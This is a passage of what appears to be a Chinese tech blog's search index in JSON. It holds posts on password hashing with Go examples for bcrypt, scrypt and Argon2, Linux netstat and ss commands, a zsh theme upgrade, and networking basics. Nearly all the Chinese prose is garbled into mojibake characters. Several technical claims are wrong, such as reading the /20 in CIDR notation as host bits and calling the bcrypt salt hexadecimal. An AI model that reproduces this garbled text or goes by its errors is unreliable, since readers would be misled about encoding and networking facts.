ä¸ºåŠ¨ä¸åŠ¨å°±å¯ä»¥æ‰©å®¹åŠ æœºå™¨æ¥æ‰›æ›´é«˜çš„å¹¶å‘ã€‚é‚£ä¹ˆä¸€äº›æ¯”è¾ƒç®€å•çš„æŸ¥è¯¢ã€ç»Ÿè®¡ç±»çš„æ“ä½œï¼Œå¯ä»¥è€ƒè™‘ç”¨ es æ¥æ‰¿è½½ï¼Œè¿˜æœ‰ä¸€äº›å…¨æ–‡æœç´¢ç±»çš„æ“ä½œï¼Œä¹Ÿå¯ä»¥è€ƒè™‘ç”¨ es æ¥æ‰¿è½½ã€‚\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://developer.aliyun.com/article/773015\n+ https://www.doc88.com/p-7418627676962.html","tags":["é«˜å¹¶å‘"],"categories":["é«˜å¹¶å‘"]},{"title":"å¦‚ä½•æ­£ç¡®å­˜å‚¨å¯†ç ","url":"%2Fp%2F4fe35076.html","content":"\n\n\n# 1. å“ˆå¸Œè¿˜æ˜¯åŠ å¯†?\n\nå“ˆå¸Œï¼ˆHashï¼‰æ˜¯å°†ç›®æ ‡æ–‡æœ¬è½¬æ¢æˆå…·æœ‰ç›¸åŒé•¿åº¦çš„ã€ä¸å¯é€†çš„æ‚å‡‘å­—ç¬¦ä¸²ï¼ˆæˆ–å«åšæ¶ˆæ¯æ‘˜è¦ï¼‰è€ŒåŠ å¯†ï¼ˆEncryptï¼‰æ˜¯å°†ç›®æ ‡æ–‡æœ¬è½¬æ¢æˆå…·æœ‰ä¸åŒé•¿åº¦çš„ã€å¯é€†çš„å¯†æ–‡ã€‚\n\nå“ˆå¸Œç®—æ³•å¾€å¾€è¢«è®¾è®¡æˆç”Ÿæˆå…·æœ‰ç›¸åŒé•¿åº¦çš„æ–‡æœ¬ï¼Œè€ŒåŠ å¯†ç®—æ³•ç”Ÿæˆçš„æ–‡æœ¬é•¿åº¦ä¸æ˜æ–‡æœ¬èº«çš„é•¿åº¦æœ‰å…³ã€‚å“ˆå¸Œç®—æ³•æ˜¯ä¸å¯é€†çš„ï¼Œè€ŒåŠ å¯†ç®—æ³•æ˜¯å¯é€†çš„ã€‚\n\n<!-- more -->\n\nå“ˆå¸Œå‡½æ•°å¹¶ä¸æ˜¯ä¸“é—¨ç”¨æ¥è®¾è®¡å­˜å‚¨ç”¨æˆ·å¯†ç çš„,ä¸è®ºå¦‚ä½•ï¼Œä½¿ç”¨ MD5ã€MD5 åŠ ç›æˆ–è€…å…¶ä»–å“ˆå¸Œçš„æ–¹å¼æ¥å­˜å‚¨å¯†ç éƒ½æ˜¯ä¸å®‰å…¨çš„.\n\nä½¿ç”¨åŠ å¯†çš„æ–¹å¼å­˜å‚¨å¯†ç ç›¸æ¯”äºå“ˆå¸ŒåŠ ç›çš„æ–¹å¼ï¼Œåœ¨ä¸€äº›å®‰å…¨æ„è¯†å’Œèƒ½åŠ›è¾ƒå·®çš„å…¬å¸å’Œç½‘ç«™åè€Œæ›´å®¹æ˜“å¯¼è‡´å¯†ç çš„æ³„éœ²å’Œå®‰å…¨äº‹æ•…ã€‚\n\n\n\nå“ˆå¸ŒåŠ ç›çš„æ–¹å¼ç¡®å®èƒ½å¤Ÿå¢åŠ æ”»å‡»è€…çš„æˆæœ¬ï¼Œä½†æ˜¯ä»Šå¤©æ¥çœ‹è¿˜è¿œè¿œä¸å¤Ÿï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§æ›´åŠ å®‰å…¨çš„æ–¹å¼æ¥å­˜å‚¨ç”¨æˆ·çš„å¯†ç ï¼Œè¿™ä¹Ÿå°±æ˜¯ä»Šå¤©è¢«å¹¿æ³›ä½¿ç”¨çš„æ…¢å“ˆå¸Œç®—æ³•. \n\næ…¢å“ˆå¸Œç®—æ³•æ˜¯ä¸ºå“ˆå¸Œå¯†ç è€Œä¸“é—¨è®¾è®¡çš„ï¼Œæ‰€ä»¥å®ƒæ˜¯ä¸€ä¸ªæ‰§è¡Œç›¸å¯¹è¾ƒæ…¢çš„ç®—æ³•, è‡ªå·±è®¡ç®—èµ·æ¥éƒ½æ…¢, é‚£ä¹ˆç ´è§£èµ·æ¥ä¹Ÿä¼šéå¸¸æ…¢.\n\n\n\n# 2. ç ´è§£å“ˆå¸Œ\n\n+ æš´åŠ›æšä¸¾æ³•ï¼šç®€å•ç²—æš´åœ°æšä¸¾å‡ºæ‰€æœ‰åŸæ–‡ï¼Œå¹¶è®¡ç®—å‡ºå®ƒä»¬çš„å“ˆå¸Œå€¼ï¼Œçœ‹çœ‹å“ªä¸ªå“ˆå¸Œå€¼å’Œç»™å®šçš„ä¿¡æ¯æ‘˜è¦ä¸€è‡´ã€‚\n\n+ å­—å…¸æ³•ï¼šé»‘å®¢åˆ©ç”¨ä¸€ä¸ªå·¨å¤§çš„å­—å…¸ï¼Œå­˜å‚¨å°½å¯èƒ½å¤šçš„åŸæ–‡å’Œå¯¹åº”çš„å“ˆå¸Œå€¼ã€‚ç ´è§£æ—¶é€šè¿‡å¯†æ–‡ç›´æ¥åæŸ¥æ˜æ–‡ã€‚ä½†å­˜å‚¨ä¸€ä¸ªè¿™æ ·çš„æ•°æ®åº“ï¼Œç©ºé—´æˆæœ¬æ˜¯æƒŠäººçš„ã€‚\n\n+ å½©è™¹è¡¨ï¼ˆrainbowï¼‰æ³•ï¼šåœ¨å­—å…¸æ³•çš„åŸºç¡€ä¸Šæ”¹è¿›ï¼Œä»¥æ—¶é—´æ¢ç©ºé—´ã€‚æ˜¯ç°åœ¨ç ´è§£å“ˆå¸Œå¸¸ç”¨çš„åŠæ³•ã€‚\n\n  \n\n  è™½ç„¶å½©è™¹è¡¨æœ‰ç€å¦‚æ­¤æƒŠäººçš„ç ´è§£æ•ˆç‡ï¼Œä½†ç½‘ç«™çš„å®‰å…¨äººå‘˜ä»ç„¶æœ‰åŠæ³•é˜²å¾¡å½©è™¹è¡¨ã€‚æœ€æœ‰æ•ˆçš„æ–¹æ³•å°±æ˜¯â€œåŠ ç›â€ï¼Œå³åœ¨å¯†ç çš„ç‰¹å®šä½ç½®æ’å…¥ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªç‰¹å®šå­—ç¬¦ä¸²å°±æ˜¯â€œç›ï¼ˆSaltï¼‰â€ï¼ŒåŠ ç›åçš„å¯†ç ç»è¿‡å“ˆå¸ŒåŠ å¯†å¾—åˆ°çš„å“ˆå¸Œä¸²ä¸åŠ ç›å‰çš„å“ˆå¸Œä¸²å®Œå…¨ä¸åŒï¼Œé»‘å®¢ç”¨å½©è™¹è¡¨å¾—åˆ°çš„å¯†ç æ ¹æœ¬å°±ä¸æ˜¯çœŸæ­£çš„å¯†ç ã€‚å³ä½¿é»‘å®¢çŸ¥é“äº†â€œç›â€çš„å†…å®¹ã€åŠ ç›çš„ä½ç½®ï¼Œè¿˜éœ€è¦å¯¹Hå‡½æ•°å’ŒRå‡½æ•°è¿›è¡Œä¿®æ”¹ï¼Œå½©è™¹è¡¨ä¹Ÿéœ€è¦é‡æ–°ç”Ÿæˆï¼Œå› æ­¤åŠ ç›èƒ½å¤§å¤§å¢åŠ åˆ©ç”¨å½©è™¹è¡¨æ”»å‡»çš„éš¾åº¦ã€‚\n  \n\n\n\n# 3. BcryptåŠ å¯†\n\nBcryptå†…éƒ¨è‡ªå·±å®ç°äº†éšæœºåŠ ç›å¤„ç†ã€‚ä½¿ç”¨Bcryptï¼Œæ¯æ¬¡åŠ å¯†åçš„å¯†æ–‡æ˜¯ä¸ä¸€æ ·çš„ã€‚å¯¹ä¸€ä¸ªå¯†ç ï¼ŒBcryptæ¯æ¬¡ç”Ÿæˆçš„hashéƒ½ä¸ä¸€æ ·ï¼Œé‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•è¿›è¡Œæ ¡éªŒçš„ï¼Ÿ\n\nè™½ç„¶å¯¹åŒä¸€ä¸ªå¯†ç ï¼Œæ¯æ¬¡ç”Ÿæˆçš„hashä¸ä¸€æ ·ï¼Œä½†æ˜¯hashä¸­åŒ…å«äº†saltï¼ˆhashäº§ç”Ÿè¿‡ç¨‹ï¼šå…ˆéšæœºç”Ÿæˆsaltï¼Œsaltè·Ÿpasswordè¿›è¡Œhashï¼‰ï¼›\n\nåœ¨ä¸‹æ¬¡æ ¡éªŒæ—¶ï¼Œä»hashä¸­å–å‡ºsaltï¼Œsaltè·Ÿpasswordè¿›è¡Œhashï¼›å¾—åˆ°çš„ç»“æœè·Ÿä¿å­˜åœ¨DBä¸­çš„hashè¿›è¡Œæ¯”å¯¹ã€‚\n\nä¸¾ä¸ªæ —å­ï¼Œå‡å¦‚ä¸€ä¸ªå¯†æ–‡æ˜¯ `$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa`, é‚£ä¹ˆé€šè¿‡ `$` åˆ†éš”ç¬¦æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸‹é¢ä¸‰ä¸ªä¿¡æ¯:\n\n1. `2a` è¡¨ç¤ºçš„æ˜¯ç”¨äºæ­¤æ¬¡è®¡ç®—çš„ bcrypt ç®—æ³•ç‰ˆæœ¬ï¼›\n2. `10` è¡¨ç¤ºçš„æ˜¯ `log_rounds` å€¼ï¼›\n3. `vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa` æ˜¯ salt å’ŒåŠ å¯†æ–‡æœ¬çš„æ‹¼æ¥å€¼ (ç»è¿‡äº† base 64 ç¼–ç ï¼Œå‰é¢ 22 ä¸ªå­—æ¯æ˜¯ salt çš„åå…­è¿›åˆ¶å€¼ã€‚\n\n\n\n# 4. PBKDF2ï¼ŒScryptï¼ŒBcrypt å’Œ ARGON2å¯¹æ¯”\n\n+ PBKDF2\n\nPBKDF2 è¢«è®¾è®¡çš„å¾ˆç®€å•ï¼Œå®ƒçš„åŸºæœ¬åŸç†æ˜¯é€šè¿‡ä¸€ä¸ªä¼ªéšæœºå‡½æ•°ï¼ˆä¾‹å¦‚ HMAC å‡½æ•°ï¼‰ï¼ŒæŠŠæ˜æ–‡å’Œä¸€ä¸ªç›å€¼ä½œä¸ºè¾“å…¥å‚æ•°ï¼Œç„¶åæŒ‰ç…§è®¾ç½®çš„è®¡ç®—å¼ºåº¦å› å­é‡å¤è¿›è¡Œè¿ç®—ï¼Œå¹¶æœ€ç»ˆäº§ç”Ÿå¯†é’¥ã€‚\n\nè¿™æ ·çš„é‡å¤ hash å·²ç»è¢«è®¤ä¸ºè¶³å¤Ÿå®‰å…¨ï¼Œä½†ä¹Ÿæœ‰äººæå‡ºäº†ä¸åŒæ„è§ï¼Œæ­¤ç±»ç®—æ³•å¯¹äºä¼ ç»Ÿçš„ CPU æ¥è¯´çš„ç¡®æ˜¯è¶³å¤Ÿå®‰å…¨ï¼Œä½¿ç”¨GPUé˜µåˆ—ã€æˆ–FPGAæ¥ç ´è§£PBKDF2ä»ç›¸å¯¹å®¹æ˜“ã€‚æ³¨æ„è¿™é‡Œè¯´çš„æ˜¯ç›¸å¯¹ï¼Œä¸ºäº†æ¯”è¾ƒæ¥ä¸‹æ¥æåˆ°çš„å¦å¤–ä¸¤ç§ç®—æ³•ã€‚\n\n+ BCrypt\n\nBCrypt åœ¨1999å¹´å‘æ˜ï¼Œç”±äºä½¿ç”¨GPUã€FPGAçš„ç ´è§£æ˜¯åŸºäºå®ƒä»¬ç›¸å¯¹äºCPUçš„å¹¶è¡Œè®¡ç®—ä¼˜åŠ¿ï¼Œå› æ­¤BCryptç®—æ³•ä¸ä»…è®¾è®¡ä¸ºCPUè¿ç®—å¯†é›†ï¼Œè€Œä¸”æ˜¯å†…å­˜IOå¯†é›†ã€‚\n\nç„¶è€Œéšç€æ—¶é—´è¿ç§»ï¼Œç›®å‰æ–°çš„FPGAå·²ç»é›†æˆäº†å¾ˆå¤§çš„RAMï¼ˆç±»å‹CPUç¼“å­˜ã€å¤§çº¦å‡ åå…†ï¼‰ï¼Œè§£å†³äº†å†…å­˜å¯†é›†IOçš„é—®é¢˜ã€‚\n\n+ Scrypt\n\nScrypt äº2009å¹´äº§ç”Ÿï¼Œå¼¥è¡¥äº†BCryptçš„ä¸è¶³ã€‚å®ƒå°†CPUè®¡ç®—ä¸å†…å­˜ä½¿ç”¨å¼€é”€æå‡äº†ä¸€ä¸ªå±‚æ¬¡ï¼Œä¸ä»…CPUè¿ç®—éœ€è¦æŒ‡æ•°æ—¶é—´å¼€é”€ï¼Œè¿˜éœ€è¦æŒ‡æ•°å†…å­˜IOå¼€é”€ã€‚\n\n+ Argon2\n\nArgon2 æœ‰ä¸¤ä¸ªä¸»è¦çš„ç‰ˆæœ¬ï¼š**Argon2i** æ˜¯å¯¹æŠ—ä¾§ä¿¡é“æ”»å‡»çš„æœ€å®‰å…¨é€‰æ‹©ï¼Œè€Œ **Argon2d** æ˜¯æŠµæŠ— GPU ç ´è§£æ”»å‡»çš„æœ€å®‰å…¨é€‰æ‹©ã€‚\n\nåœ¨ 2019 å¹´ï¼Œæˆ‘å»ºè®®ä½ ä»¥åä¸è¦ä½¿ç”¨PBKDF2 æˆ– BCryptï¼Œå¹¶å¼ºçƒˆå»ºè®®å°† Argon2ï¼ˆæœ€å¥½æ˜¯ **Argon2id**ï¼‰ç”¨äºæœ€æ–°ç³»ç»Ÿã€‚\n\nScrypt æ˜¯å½“ Argon2 ä¸å¯ç”¨æ—¶çš„ä¸äºŒé€‰æ‹©ï¼Œä½†è¦è®°ä½ï¼Œå®ƒåœ¨ä¾§ä¾§ä¿¡é“æ³„éœ²æ–¹é¢ä¹Ÿå­˜åœ¨ç›¸åŒçš„é—®é¢˜ã€‚\n\n  \n\n# 5. ä»£ç å®ç°\n\n+ pbkdf2 ä¸æ¨è\n\n  ```go\n  package main\n  \n  import (\n  \t\"crypto/sha256\"\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/pbkdf2\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := \"salt\"\n  \n  \tres1 := pbkdf2.Key([]byte(passwd), []byte(salt), 10, 20, sha256.New)\n  \tfmt.Println(string(res1)) //'J!85|LU@\n  \n  \t// åŠ å¯†åä¸€æ ·\n  \tres2 := pbkdf2.Key([]byte(passwd), []byte(salt), 10, 20, sha256.New)\n  \tfmt.Println(string(res2)) //'J!85|LU@\n  \n  }\n  ```\n\n  \n\n+ bcrypt æ¨è\n\n  ```go\n  package main\n  \n  import (\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/bcrypt\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \t\n    // costé»˜è®¤æ˜¯10,ä¸è¦å¤ªå°\n  \tres1, _ := bcrypt.GenerateFromPassword([]byte(passwd), 10)\n  \tfmt.Println(string(res1)) //$2a$10$Y85p96ZRD1Sa5iU7M/ngku9MIFNkmAwEI38FvPT9dj628E8hPOU0K\n  \n  \t// åŠ å¯†ç»“æœä¸ä¸€æ ·\n  \tres2, _ := bcrypt.GenerateFromPassword([]byte(passwd), 10)\n  \tfmt.Println(string(res2)) //$2a$10$7xUWgmWB3te5OipBYx4aheUFz7dCcj7JLIpQW6D/Me1R4qljEIFy2\n  \n  \terr1 := bcrypt.CompareHashAndPassword(res1, []byte(passwd))\n  \tfmt.Println(err1) //nil\n  \n  \terr2 := bcrypt.CompareHashAndPassword(res1, []byte(\"random\"))\n  \tfmt.Println(err2) //crypto/bcrypt: hashedPassword is not the hash of the given password\n  }\n  ```\n\n+ scrypt æ¨è\n\n  ```go\n  package main\n  \n  import (\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/scrypt\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := []byte{0xc8, 0x28, 0xf2, 0x58, 0xa7, 0x6a, 0xad, 0x7b}\n  \n  \tres1, _ := scrypt.Key([]byte(passwd), salt, 1<<15, 8, 1, 32)\n  \tfmt.Println(string(res1)) //TCoi[DRt;IALuw}\n  \n  \tres2, _ := scrypt.Key([]byte(passwd), salt, 1<<15, 8, 1, 32)\n  \tfmt.Println(string(res2)) //TCoi[DRt;IALuw}\n  }\n  ```\n\n  \n\n+ argon2 æ¨è\n\n  ```go\n  package main\n  \n  import (\n  \t\"encoding/base64\"\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/argon2\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := \"salt\"\n  \n  \tres1 := argon2.IDKey([]byte(passwd), []byte(salt), 3, 32, 4, 32)\n  \tfmt.Println(base64.StdEncoding.EncodeToString(res1)) //uEZgAbCSfDyd8VAMbcmSSZKpH/TQ9hh9VsblPFGuDjM\n  \n  \tres2 := argon2.IDKey([]byte(passwd), []byte(salt), 3, 32, 4, 32)\n  \tfmt.Println(base64.StdEncoding.EncodeToString(res2)) //uEZgAbCSfDyd8VAMbcmSSZKpH/TQ9hh9VsblPFGuDjM\n  }\n  ```\n\n\n\n\n# 6. æ•°æ®åº“å­˜å‚¨\n\nå¦‚æœå­˜å‚¨æ…¢å“ˆå¸Œçš„å¯†ç , ä¸€èˆ¬éƒ½æ˜¯å­˜å‚¨å®šé•¿çš„. å¦‚`char(60)`\n\nå‚è€ƒ: https://stackoverflow.com/questions/247304/what-data-type-to-use-for-hashed-password-field-and-what-length/\n\n\n\n# 7. å‚è€ƒèµ„æ–™\n\n+  https://draveness.me/whys-the-design-password-with-md5/\n\n+ https://github.com/luokuning/blogs/issues/9\n\n+ https://juejin.im/post/5e70c152518825491949886e\n\n+ https://www.jianshu.com/p/732d9d960411","tags":["å¯†ç "],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"æŸ¥çœ‹linuxè¿æ¥æ•°å’ŒçŠ¶æ€","url":"%2Fp%2F26be861f.html","content":"\n# 1. Netstat å‘½ä»¤\n\n### 1.1 æŸ¥çœ‹ TCP è¿æ¥æ•°åŠçŠ¶æ€\n\n```bash\nnetstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'\n\n\nESTABLISHED 1028\nFIN_WAIT1 1\nTIME_WAIT 3314\n```\n\n<!-- more -->\n\n### 1.2 æŸ¥çœ‹çŠ¶æ€çš„æ¬¡æ•°\n\n```bash \nnetstat -an | grep ESTABLISHED | wc -l\n1215\n\nnetstat -an | grep TIME_WAIT | wc -l\n4678\n\n```\n\n### 1.3 è¿æ¥åˆ°å…¶ä»–æœåŠ¡å™¨æ•°é‡\n\n```bash\n# tuçš„æ„æ€åªæŸ¥è¯¢tcp å’Œ udp\nnetstat -ntu| awk  '{print $4}' | sort | uniq -c | sort -nr | head\n\n 53 172.31.41.180:9061\n 45 172.31.41.180:9038\n 36 127.0.0.1:9093\n 29 127.0.0.1:9082\n 24 127.0.0.1:9051\n 22 127.0.0.1:9038\n 20 127.0.0.1:9091\n 19 127.0.0.1:9041\n 15 172.31.41.180:9082\n 11 127.0.0.1:9030\n\nnetstat -ntu| grep ESTABLISHED | awk  '{print $4}' | sort | uniq -c | sort -nr | head\nnetstat -ntu| grep TIME_WAIT | awk  '{print $4}' | sort | uniq -c | sort -nr | head\n\n```\n\n### 1.4 è¿æ¥åˆ°æœ¬æœºçš„æ•°é‡\n\n```bash \nnetstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head \n\n2987 127.0.0.1\n1118 172.31.1.150\n453 172.31.26.159\n 90 172.31.20.166\n 84 172.31.52.62\n 75 172.31.41.180\n 44 172.31.31.250\n 29 172.31.0.230\n 26 172.31.18.56\n 23 3.101.114.45\n\n\nnetstat -ntu | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head \nnetstat -ntu | grep TIME_WAIT | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head \n```\n\n# 2. SS å‘½ä»¤\n\n### 2.1 æŸ¥çœ‹ TCP çš„è¿æ¥çŠ¶æ€\n\n```bash\nss  -tan|awk 'NR>1{++S[$1]}END{for (a in S) print a,S[a]}'\n\n\nLISTEN 35\nESTAB 986\nTIME-WAIT 3560\n```\n\n### 2.2 æŸ¥çœ‹ socket çš„æ¦‚è¦ç»Ÿè®¡ä¿¡æ¯\n\n```bash\nss -s\n\n\nTotal: 884\nTCP:   4392 (estab 667, closed 3690, orphaned 0, timewait 3687)\n\nTransport Total     IP        IPv6\nRAW       1         0         1\nUDP       4         3         1\nTCP       702       404       298\nINET      707       407       300\nFRAG      0         0         0\n\n```\n\n# 3. å‚è€ƒèµ„æ–™\n\n- https://www.jianshu.com/p/e72ed5504b0c\n- https://learnku.com/articles/24360\n- https://wangchujiang.com/linux-command/c/ss.html\n","tags":["linux"],"categories":["ç³»ç»Ÿ"]},{"title":"zshä¸»é¢˜powerlevel9kå‡çº§åˆ°powerlevel10k","url":"%2Fp%2F4fd520f9.html","content":"\n\n\nä¸ºä»€ä¹ˆå‡çº§ï¼Ÿ\n\nPowerlevel9ké¡¹ç›®ä¸å†ç»´æŠ¤ï¼ŒPowerlevel10kæ›´å¿«æ›´å¼ºå¤§ï¼ˆ10-100å€çš„æ€§èƒ½æå‡ï¼‰ã€‚\n\nPowerlevel10kå¹¶ä¸”å®Œç¾å…¼å®¹Powerlevel9k, ä»¥å‰çš„é…ç½®å‚æ•°å¯ä»¥ä¸ç”¨ä»»ä½•ä¿®æ”¹.\n\n<!-- more -->\n\n### 1. æ›¿æ¢\n\n```bash\ngit clone --depth=1 https://github.com/romkatv/powerlevel10k.git $ZSH_CUSTOM/themes/powerlevel10k\n\n# Replace ZSH_THEME=\"powerlevel9k/powerlevel9k\" with ZSH_THEME=\"powerlevel10k/powerlevel10k\".\n```\n\n\n\n### 2. é…ç½®\n\nå¯ä»¥é€šè¿‡ `p10k configure` å®‰è£…æ¨èå­—ä½“. ä¹Ÿå¯ä»¥`p10k configure`è¿›è¡Œå‚»ç“œå¼ä¸»é¢˜é…ç½®. ä¸è¿‡è¿˜æ˜¯å»ºè®®è‡ªå·±å®šåˆ¶.\n\n```\np10k configure\n```\n\n\n\n### 3. æˆ‘çš„é…ç½®\n\n```yaml\nPOWERLEVEL9K_MODE='nerdfont-complete'\nZSH_THEME=\"powerlevel10k/powerlevel10k\"\nPOWERLEVEL9K_CONTEXT_TEMPLATE='%n'\nPOWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND='white'\nPOWERLEVEL9K_PROMPT_ON_NEWLINE=true\nPOWERLEVEL9K_MULTILINE_LAST_PROMPT_PREFIX=\"%F{014}\\u2570%F{cyan}\\uF460%F{073}\\uF460%F{109}\\uF460%f \"\nPOWERLEVEL9K_SHORTEN_DIR_LENGTH=1\nPOWERLEVEL9K_NODE_VERSION_BACKGROUND=\"002\"\nPOWERLEVEL9K_NODE_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_GO_VERSION_BACKGROUND=\"001\"\nPOWERLEVEL9K_GO_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_WIFI_BACKGROUND=\"003\"\nPOWERLEVEL9K_WIFI_FOREGROUND=\"black\"\nPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(os_icon context ssh dir vcs)\nPOWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status proxy anaconda node_version go_version wifi)\n\n# çœ‹é¢œè‰²\n# for i in {0..255}; do print -Pn \"%K{$i}  %k%F{$i}${(l:3::0:)i}%f \" ${${(M)$((i%6)):#3}:+$'\\n'}; done\n```\n\n\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ https://github.com/romkatv/powerlevel10k\n+ https://www.liuvv.com/p/6600d67c.html\n\n","tags":["zsh"],"categories":["ç»ˆç«¯"]},{"title":"è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹","url":"%2Fp%2F57254ff8.html","content":"\n\n\n# 1. MACåœ°å€\n\næ˜¯å¯¹ç½‘ç»œä¸Šå„æ¥å£çš„å”¯ä¸€æ ‡è¯†, æ³¨æ„è€Œä¸æ˜¯è®¾å¤‡çš„å”¯ä¸€æ ‡è¯†\n\nå› ä¸ºæ™®é€šç”µè„‘å°±æœ‰çº¿ç½‘å¡å’Œæ— çº¿ç½‘å¡, äº¤æ¢æœºå’Œè·¯ç”±å™¨æ›´æ˜¯æœ‰å¤šä¸ª mac åœ°å€\n<!-- more -->\n\n\n+ å•æ’­ mac åœ°å€  å°±æ˜¯æŸ¥çœ‹è‡ªå·±æ˜¯å¦åŒ¹é…, åŒ¹é…æ¥å—\n\n+ å¹¿æ’­ mac åœ°å€  FF-FF-FF-FF-FF-FF, æ¥å—\n\n+ å¤šæ’­ mac åœ°å€ çœ‹è‡ªå·±çš„æ˜¯å¦åœ¨è¿™ä¸ªå¤šæ’­ç§Ÿ, åœ¨çš„è¯æ¥å—\n\n\n\n# 2. IP åœ°å€\n\nåœ¨æ•°æ®åŒ…çš„è½¬å‘è¿‡ç¨‹ä¸­, æº ipåœ°å€å’Œç›®çš„ ip åœ°å€ä¸å˜, æº mac åœ°å€å’Œç›®çš„ mac åœ°å€ä¸€ç›´å˜\n\n\n\n# 3. ARPåè®®\n\næ¯ä¸ªä¸»æœºæœ‰è‡ªå·±çš„ arp ç¼“å­˜è¡¨,  ä¸çŸ¥é“åˆ«äººçš„å°±éœ€è¦å‘é€ arp æŠ¥æ–‡\n\narp ç¼“å­˜è¡¨æœ‰ç±»å‹, é™æ€å’ŒåŠ¨æ€,  ä¸€èˆ¬æ˜¯åŠ¨æ€, ä¸¤åˆ†é’Ÿå¤±æ•ˆ, å› ä¸ºæœ‰å¯èƒ½ä½ æ¢ ip\n\narp åªèƒ½åœ¨åŒä¸€ä¸ªç½‘ç»œä¸­ä½¿ç”¨, ä¸èƒ½è·¨ç½‘ç»œè¯¢é—®\n\n\n\n# 4. é›†çº¿å™¨å’Œäº¤æ¢æœº\n\né›†çº¿å™¨ç»™ä»¥å¤ªç½‘æ¯ä¸ªè®¾å¤‡å‘é€(ç‰©ç†å±‚)\n\näº¤æ¢æœºç»™ç›®çš„ä¸»æœºå‘é€(æ•°æ®é“¾è·¯å±‚,ä¹ŸåŒ…æ‹¬ç‰©ç†å±‚)\n\n\n\né›†çº¿å™¨å’Œäº¤æ¢æœºç»„æˆçš„ç½‘ç»œå±äºåŒä¸€ä¸ªå¹¿æ’­åŸŸ,å°±æ˜¯å¹¿æ’­çš„éƒ½èƒ½æ”¶åˆ°\n\näº¤æ¢æœºé€šè¿‡è‡ªå­¦ä¹ çš„æ–¹æ³•, è®°å½•ä¸»æœº mac åœ°å€æ‰€å¯¹åº”çš„æ¥å£å·\n\n\n\nä¸ºäº†ä»¥å¤ªç½‘ç¨³å®š, ä¸€èˆ¬å†—ä½™äº¤æ¢æœºçº¿è·¯è¿æ¥, ä½†æ˜¯æœ‰å¯èƒ½å‘ç”Ÿå¹¿æ’­é£æš´(ç¯), å¯ä»¥é€šè¿‡ç”Ÿæˆæ ‘åè®®STP ,é¿å…ç¯è·¯(æœ€å°ç”Ÿæˆæ ‘)\n\n\n\n# 5. VALN\n\nä¸€ä¸ªæˆ–å¤šä¸ªäº¤æ¢æœº,ä¸åŒçš„æ¥å£åˆ’åˆ†æˆå¤šä¸ª VLAN\n\né€šè¿‡ VLANç¼©å°å¹¿æ’­åŸŸ, è¿˜å¯ä»¥ç”¨è·¯ç”±å™¨éš”ç¦»å¹¿æ’­åŸŸ\n\näº¤æ¢æœºæ¥å£ç±»å‹: Access, Trunk, Hybrid(åä¸º)\n\nVLAN è®¾ç½®, å’Œä¸»æœºè¿æ¥çš„äº¤æ¢æœºç”¨ ACCESSç«¯å£, äº¤æ¢æœºäº’è”çš„ç«¯å£ç”¨ Trunk ç«¯å£\n\n\n\n# 6. IPV4\n\n### 6.1 åˆ†ç±»ç¼–å€\n\nç½‘ç»œå·+ä¸»æœºå· 4ä¸ªå­—èŠ‚32ä½\n\nA ç±» 0-127    ç½‘ç»œå·1ä¸ªå­—èŠ‚\n\nB ç±» 128-191  ç½‘ç»œå·2ä¸ªå­—èŠ‚\n\nC ç±» 192-223 ç½‘ç»œå·3ä¸ªå­—èŠ‚\n\nD ç±»  å¤šæ’­åœ°å€\n\nE ç±»  ä¿ç•™ä½¿ç”¨\n\n### 6.2 åˆ’åˆ†å­ç½‘\n\nä»ä¸»æœºå·å€Ÿç”¨ä¸€éƒ¨åˆ†ç»™å­ç½‘å·,  æœ‰ç§ä»Bç±»é™çº§åˆ°Cç±»çš„æ„Ÿè§‰\n\nå­ç½‘æ©ç , å‰é¢1ä»£è¡¨ç½‘ç»œå·, 0ä»£è¡¨ä¸»æœºå·, ç„¶åé€»è¾‘ä¸è¿ç®—, å¾—åˆ°å­ç½‘çš„ç½‘ç»œåœ°å€(ç½‘ç»œèµ·å§‹çš„åœ°å€,xxx.xxx.xxx.0)\n\nC ç±»åœ°å€é»˜è®¤å­ç½‘æ©ç å°±æ˜¯255.255.255.0\n\n### 6.3 æ— åˆ†ç±»ç¼–å€\n\nå¿˜è®°å‰ä¸¤ç§æ–¹æ³•\n\n128.14.35.7/20 è¡¨æ˜20ä¸ªæ˜¯ä¸»æœºå·\n\n\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/1.png)\n\n\n\næ ¹æ®æ— åˆ†ç±», è·¯ç”±é€‰æ‹©æœ€é•¿å‰ç¼€åŒ¹é…, è®¤ä¸ºè¶Šé•¿,è·¯ç”±æ›´å…·ä½“\n\n\n\n# 7. IPæ•°æ®æŠ¥\n\nç»™åˆ«äººå‘æ•°æ®æŠ¥, å…ˆçœ‹è‡ªå·±å’Œåˆ«äººçš„ç½‘ç»œåœ°å€æ˜¯å¦ä¸€æ ·, 